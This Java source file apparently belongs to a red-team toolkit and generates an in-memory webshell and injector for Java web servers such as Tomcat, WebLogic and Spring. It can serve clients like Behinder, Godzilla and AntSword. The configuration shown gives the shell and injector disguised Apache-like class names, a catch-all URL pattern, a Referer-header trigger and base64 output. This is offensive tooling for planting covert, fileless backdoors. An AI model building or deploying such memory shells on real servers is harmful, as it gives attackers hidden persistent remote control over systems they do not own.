package com.potato.potatotool.content.redTeam.memshell;

import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import com.potato.potatotool.content.redTeam.memshell.util.ClassNameUtil;
import com.potato.potatotool.content.redTeam.memshell.util.RandomHeaderUtil;
import com.potato.potatotool.utils.strUtils;

import java.util.Map;

/**
 * @author Potato
 * @date 2024/7/29 15:43
 */
public class GenerateMemoryShell {

    public static void main(String[] args) throws Exception {
        MemoryObj memoryObj = initMemoryObj();
        memoryObj.buildMemoryShellAndInjector();

        Map<String, String> showResultMap = memoryObj.getShowResultMap();

        System.out.println(showResultMap);
    }

    private static MemoryObj initMemoryObj() {
        MemoryObj memoryObj = new MemoryObj();

        memoryObj.setToolType(MemoryShellConstants.TOOL_BEHINDER);
//        memoryObj.setToolType(MemoryShellConstants.TOOL_GODZILLA);
//        memoryObj.setToolType(MemoryShellConstants.TOOL_ANTSWORD);
//        memoryObj.setToolType(MemoryShellConstants.TOOL_SUO5);
//        memoryObj.setToolType(MemoryShellConstants.TOOL_NEOREGEORG);
        memoryObj.setServerType(MemoryShellConstants.SERVER_TOMCAT);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_RESIN);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_WEBLOGIC);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_WEBSPHERE);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_JETTY);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_UNDERTOW);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_GLASSFISH);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_JBOSS);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_SPRING_MVC);
//        memoryObj.setServerType(MemoryShellConstants.SERVER_SPRING_WEBFLUX);
        memoryObj.setShellType(MemoryShellConstants.SHELLTYPE_LISTENER);
//        memoryObj.setShellType(MemoryShellConstants.SHELLTYPE_FILTER);
//        memoryObj.setShellType(MemoryShellConstants.SHELLTYPE_INTERCEPTOR);
//        memoryObj.setShellType(MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD);
        memoryObj.setOutputFormat(MemoryShellConstants.OUTPUTFORMAT_BASE64);

        memoryObj.setPass("123456");
        memoryObj.setKey("123456");
        memoryObj.setShellClassName("org.apache.logging.ContextLoaderHrListener");
        memoryObj.setInjectorClassName("org.apache.commons.e.NetworkUtils");
        memoryObj.setUrlPattern("/*");
        memoryObj.setHeaderName("Referer");
        memoryObj.setHeaderValue("Qatx");

        if (memoryObj.getPass() == null) memoryObj.setPass(strUtils.generateRandomString(6, 10));
        if (memoryObj.getKey() == null) memoryObj.setKey(strUtils.generateRandomString(6, 10));
        if (memoryObj.getToolType().equals(MemoryShellConstants.TOOL_NEOREGEORG)) memoryObj.setKey("key");
        if (memoryObj.getShellClassName() == null) memoryObj.setShellClassName(ClassNameUtil.getRandomShellClassName(memoryObj.getShellType()));
        if (memoryObj.getInjectorClassName() == null) memoryObj.setInjectorClassName(ClassNameUtil.getRandomInjectorClassName());
        Map.Entry<String, String> header = RandomHeaderUtil.generateRandomHeader();
        if (memoryObj.getHeaderName() == null) memoryObj.setHeaderName(header.getKey());
        if (memoryObj.getHeaderValue() == null) memoryObj.setHeaderValue(header.getValue());
        if (memoryObj.getUrlPattern() == null || memoryObj.getUrlPattern().equals("/*") || memoryObj.getUrlPattern().equals("/")) {
            if (memoryObj.getShellType().equals(MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD)) {
                memoryObj.setUrlPattern("/" + strUtils.generateRandomString(6, 6).toLowerCase());
            } else {
                memoryObj.setUrlPattern("/*");
            }
        }
        if (memoryObj.getOutputFormat().contains(MemoryShellConstants.OUTPUTFORMAT_BCEL)) memoryObj.setLoaderClassName(ClassNameUtil.getRandomLoaderClassName());
        memoryObj.setInjectorSimpleClassName(getSimpleName(memoryObj.getInjectorClassName()));

        return memoryObj;
    }

    // 获取类名的简单名称（去掉包路径）
    public static String getSimpleName(String className) {
        int lastDotIndex = className.lastIndexOf(".");
        if (lastDotIndex != -1 && lastDotIndex < className.length() - 1) {
            return className.substring(lastDotIndex + 1);
        }
        return className;
    }
}
